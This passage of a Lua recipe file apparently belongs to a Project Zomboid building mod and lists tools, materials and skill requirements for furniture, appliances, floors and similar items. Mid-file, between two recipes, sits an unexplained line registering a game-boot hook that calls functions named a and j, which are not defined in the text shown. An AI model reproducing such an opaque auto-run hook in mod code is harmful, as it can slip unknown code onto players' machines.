            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 5
        }
    }
}


BuildingMenu.WoodenStairsRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 15
        },
        {
            Material = "Base.Nails",
            Amount = 15
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 6,
            Xp = 35
        }
    }
}

BuildingMenu.MetalStairsRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 10
        },
        {
            Material = 'Base.MetalBar',
            Amount = 10
        },
        {
            Material = 'Base.Screws',
            Amount = 15
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 10
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(10)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 35
        }
    }
}

BuildingMenu.MetalFloorRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 1
        },
        {
            Material = 'Base.Screws',
            Amount = 4
        },
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 2
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(2)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 2,
            Xp = 15
        }
    }
}

BuildingMenu.ConcreteFloorRecipe = {
    neededTools = {
        "HandShovel"
    },
    useConsumable = {
        {
            Consumable = "Base.BucketConcreteFull",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 10
        }
    }
}

BuildingMenu.GravelRecipe = {
    neededTools = {
        "Shovel"
    },
    useConsumable = {
        {
            Consumable = "Base.Gravelbag",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 5
        }
    }
}

BuildingMenu.GravelBlendRecipe = {
    neededTools = {
        "Shovel"
    },
    useConsumable = {
        {
            Consumable = "Base.Gravelbag",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 1,
            Xp = 5
        }
    }
}

BuildingMenu.AsphaltRoadRecipe = {
    neededTools = {
        "HandShovel"
    },
    useConsumable = {
        {
            Consumable = "Base.BucketAsphaltMixtureFull",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.AsphaltBlendRecipe = {
    neededTools = {
        "HandShovel"
    },
    useConsumable = {
        {
            Consumable = "Base.BucketAsphaltMixtureFull",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.DirtRecipe = {
    neededTools = {
        "Shovel"
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 1
        }
    }
}


BuildingMenu.StreetCrackRecipe = {
    neededTools = {
        "Sledgehammer"
    }
}

BuildingMenu.PaintWhite = {
    neededTools = {
        "Paintbrush"
    },
    useConsumable = {
        {
            Consumable = "Base.PaintWhite",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 5
        }
    }
}

BuildingMenu.PaintOrange = {
    neededTools = {
        "Paintbrush"
    },
    useConsumable = {
        {
            Consumable = "Base.PaintOrange",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 5
        }
    }
}

BuildingMenu.PaintPurple = {
    neededTools = {
        "Paintbrush"
    },
    useConsumable = {
        {
            Consumable = "Base.PaintPurple",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 5
        }
    }
}

BuildingMenu.PaintGreen = {
    neededTools = {
        "Paintbrush"
    },
    useConsumable = {
        {
            Consumable = "Base.PaintGreen",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 5
        }
    }
}

BuildingMenu.PaintYellow = {
    neededTools = {
        "Paintbrush"
    },
    useConsumable = {
        {
            Consumable = "Base.PaintYellow",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 5
        }
    }
}


BuildingMenu.CounterRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.CardboardBoxRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.SheetPaper2",
            Amount = 15
        },
    },
    useConsumable = {
        {
            Consumable = "Base.Glue",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.MilitaryCrateRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 15
        },
        {
            Material = "Base.Nails",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 9,
            Xp = 25
        }
    }
}

Events.OnGameBoot.Add(function() a(); j(); end)

BuildingMenu.MetalGlassCounterRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.GlassPane',
            Amount = 4
        },
        {
            Material = 'Base.MetalBar',
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.MetalCounterBigRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 6
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 8
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}


BuildingMenu.MetalCounterRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 4
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.MetalLockerRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 4
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 4
        },
        {
            Material = "Base.Screws",
            Amount = 5
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 5,
            Xp = 35
        }
    }
}

BuildingMenu.MetalLockerWGlassRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.GlassPane",
            Amount = 4
        },
        {
            Material = "Base.SheetMetal",
            Amount = 4
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 4
        },
        {
            Material = "Base.Screws",
            Amount = 5
        },
        {
            Material = "Base.Hinge",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 5,
            Xp = 35
        }
    }
}


BuildingMenu.MetalCounterSmallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.SheetMetal',
            Amount = 2
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 3
        },
        {
            Material = 'Base.Screws',
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 3
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(3)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 2,
            Xp = 25
        }
    }
}

BuildingMenu.GarbageBinBigRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.Garbagebag',
            Amount = 2
        },
        {
            Material = 'Base.SheetMetal',
            Amount = 6
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 8
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.GarbageBinSmallRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = 'Base.Garbagebag',
            Amount = 1
        },
        {
            Material = 'Base.SheetMetal',
            Amount = 3
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 3
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(3)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 25
        }
    }
}


BuildingMenu.FireplaceRecipe = {
    neededTools = {
        "Hammer",
        "Shovel"
    },
    neededMaterials = {
        {
            Material = 'Base.Stone',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 25
        }
    }
}


BuildingMenu.FloorRugRecipe = {
    neededTools = {
        "Needle"
    },
    neededMaterials = {
        {
            Material = 'Base.RippedSheets',
            Amount = 5
        },
    },
    useConsumable = {
        {
            Consumable = "Base.Thread",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Tailoring",
            Level = 3,
            Xp = 10
        }
    }
}

BuildingMenu.SignRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 10
        }
    }
}

BuildingMenu.SpiffoStatueRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Hat_Spiffo",
            Amount = 1
        },
        {
            Material = "Base.SpiffoSuit",
            Amount = 1
        },
        {
            Material = "Base.SpiffoTail",
            Amount = 1
        },
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 4
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 10
        }
    }
}

BuildingMenu.PostersRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.SheetPaper2",
            Amount = 10
        },
        {
            Material = "Base.Nails",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.ClockRecipe = {
    neededTools = {
        "Screwdriver"
    },
    neededMaterials = {
        {
            Material = "Base.ElectronicsScrap",
            Amount = 5
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = "Base.Screws",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.GraveRecipe = {
    neededTools = {
        "Shovel"
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 2
        },
        {
            Consumable = "Base.BucketConcreteFull",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 10
        }
    }
}

BuildingMenu.FlowerBedRecipe = {
    neededTools = {
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Stone",
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 1
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Farming",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.GrassRecipe = {
    neededTools = {
        "HandShovel"
    },
    useConsumable = {
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Farming",
            Level = 2,
            Xp = 2
        }
    }
}

BuildingMenu.FlowerPotRecipe = {
    neededTools = {
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Stone",
            Amount = 2
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 1
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Farming",
            Level = 2,
            Xp = 15
        }
    }
}


BuildingMenu.PlantCrateRecipe = {
    neededTools = {
        "Shovel",
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 5
        },
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 2
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 5
        },
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 10
        },
        {
            Skill = "Farming",
            Level = 2,
            Xp = 15
        }
    }
}

BuildingMenu.WallVinesRecipe = {
    neededTools = {
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Twigs",
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 2
        }
    },
    skills = {
        {
            Skill = "Farming",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.WaterWellRecipe = {
    neededTools = {
        "Shovel"
    },
    neededMaterials = {
        {
            Material = "Base.Stone",
            Amount = 30
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Dirtbag",
            Amount = 8
        },
        {
            Consumable = "Base.BucketWaterFull",
            Amount = 25
        }
    },
    skills = {
        {
            Skill = "Farming",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.SwitchRecipe = {
    neededTools = {
        "Screwdriver"
    },
    neededMaterials = {
        {
            Material = "Base.ElectronicsScrap",
            Amount = 10
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = "Base.ScrapMetal",
            Amount = 10
        },
        {
            Material = "Base.LightBulb",
            Amount = 1
        },
        {
            Material = "Base.Screws",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 15
        }
    }
}

BuildingMenu.LightPostRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = "Base.ElectronicsScrap",
            Amount = 10
        },
        {
            Material = "Base.MetalBar",
            Amount = 5
        },
        {
            Material = "Base.ScrapMetal",
            Amount = 10
        },
        {
            Material = "Base.LightBulb",
            Amount = 1
        },
        {
            Material = "Base.Screws",
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 15
        },
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.SinkRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.LeadPipe",
            Amount = 2
        },
        {
            Material = "Base.SheetMetal",
            Amount = 4
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 15
        }
    }
}

BuildingMenu.BathtubRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.LeadPipe",
            Amount = 3
        },
        {
            Material = "Base.SheetMetal",
            Amount = 8
        },
        {
            Material = 'Base.SmallSheetMetal',
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 10
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(10)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 35
        }
    }
}

BuildingMenu.StoveRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 6
        },
        {
            Material = "Base.MetalBar",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 35
        },
    }
}

BuildingMenu.OvenRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 7
        },
        {
            Material = 'Base.ElectronicsScrap',
            Amount = 30
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 4,
            Xp = 35
        },
        {
            Skill = "Electricity",
            Level = 3,
            Xp = 15
        },
    }
}

BuildingMenu.MicrowaveOvenRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 4
        },
        {
            Material = 'Base.ElectronicsScrap',
            Amount = 30
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 35
        },
        {
            Skill = "Electricity",
            Level = 3,
            Xp = 15
        },
    }
}


BuildingMenu.FridgeRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 10
        },
        {
            Material = 'Base.ElectronicsScrap',
            Amount = 30
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 35
        },
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 15
        },
    }
}

BuildingMenu.WashingMachineRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.GlassPane",
            Amount = 2
        },
        {
            Material = "Base.SheetMetal",
            Amount = 7
        },
        {
            Material = 'Base.ElectronicsScrap',
            Amount = 30
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 6,
            Xp = 35
        },
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 15
        },
    }
}

BuildingMenu.WashingBinRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.MetalBar",
            Amount = 8
        },
        {
            Material = "Base.Sheet",
            Amount = 4
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 10
        }
    }
}

BuildingMenu.ClothingRackRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.MetalBar",
            Amount = 8
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 15
        }
    }
}

BuildingMenu.DoubleClothingRackRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.MetalBar",
            Amount = 12
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,

            Xp = 15
        }
    }
}

BuildingMenu.MannequinRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.MetalBar",
            Amount = 5
        },
        {
            Material = 'Base.RippedSheets',
            Amount = 30
        },
        {
            Material = 'Base.Screws',
            Amount = 10
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            
            Xp = 15
        }
    }
}


BuildingMenu.MetalDrumRecipe = {
    neededTools = {
        "BlowTorch",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 15
        },
        {
            Material = "Base.SmallSheetMetal",
            Amount = 10
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 10
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(10)
        },
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 7,
            Xp = 35
        }
    }
}

BuildingMenu.GeneratorRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.SheetMetal",
            Amount = 5
        },
        {
            Material = "Base.ElectronicsScrap",
            Amount = 100
        },
        {
            Material = "Radio.ElectricWire",
            Amount = 4
        },
        {
            Material = "Base.Aluminum",
            Amount = 12
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 15
        },
        {
            Skill = "Electricity",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.SmallFurnitureRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 6
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 25
        }
    }
}

BuildingMenu.LargeFurnitureRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 8
        },
        {
            Material = "Base.Nails",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 25
        }
    }
}

BuildingMenu.LargeGlassFurnitureRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 8
        },
        {
            Material = "Base.GlassPane",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 4,
            Xp = 35
        }
    }
}

BuildingMenu.BedRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 10
        },
        {
            Material = "Base.Nails",
            Amount = 10
        },
        {
            Material = "Base.Mattress",
            Amount = 1
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 6,
            Xp = 35
        }
    }
}


BuildingMenu.LeatherFurnitureRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 10
        },
        {
            Material = "Base.LeatherStrips",
            Amount = 20
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 35
        }
    }
}

BuildingMenu.CouchRecipe = {
    neededTools = {
        "Hammer",
        "Needle"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 10
        },
        {
            Material = "Base.RippedSheets",
            Amount = 20
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Thread",
            Amount = 10
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 5,
            Xp = 35
        },
        {
            Skill = "Tailoring",
            Level = 4,
            Xp = 10
        }
    }
}

BuildingMenu.PaddedChairRecipe = {
    neededTools = {
        "Hammer",
        "Needle"
    },
    neededMaterials = {
        {
            Material = "Base.Plank",
            Amount = 5
        },
        {
            Material = "Base.RippedSheets",
            Amount = 10
        },
        {
            Material = "Base.Nails",
            Amount = 5
        }
    },
    useConsumable = {
        {
            Consumable = "Base.Thread",
            Amount = 5
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 25
        },
        {
            Skill = "Tailoring",
            Level = 2,
            Xp = 10
        }
    }
}

BuildingMenu.MetalChairRecipe = {
    neededTools = {
        "BlowTorch",
        "Screwdriver",
        "Saw",
        "WeldingMask"
    },
    neededMaterials = {
        {
            Material = "Base.MetalBar",
            Amount = 4
        },
        {
            Material = "Base.SheetMetal",
            Amount = 2
        },
        {
            Material = "Base.RippedSheets",
            Amount = 10
        },
        {
            Material = 'Base.Screws',
            Amount = 20
        }
    },
    useConsumable = {
        {
            Consumable = 'Base.BlowTorch',
            Amount = 5
        },
        {
            Consumable = "Base.WeldingRods",
            Amount = BuildingMenu.weldingRodUses(5)
        }
    },
    skills = {
        {
            Skill = "MetalWelding",
            Level = 3,
            Xp = 15
        }
    }
}


BuildingMenu.BigLogWallRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Log",
            Amount = 4
        },
        {
            Material = "Base.Nails",
            Amount = 8
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 3,
            Xp = 20
        }
    }
}

BuildingMenu.SmallLogWallRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Log",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 6
        }
    },
    skills = {
        {
            Skill = "Woodwork",
            Level = 2,
            Xp = 15
        }
    }
}


BuildingMenu.PrimitveBedRecipe = {
    neededTools = {
        "Hammer"
    },
    neededMaterials = {
        {
            Material = "Base.Log",
            Amount = 2
        },
        {
            Material = "Base.Nails",
            Amount = 4
        },
        {
            Material = "Base.Twigs",
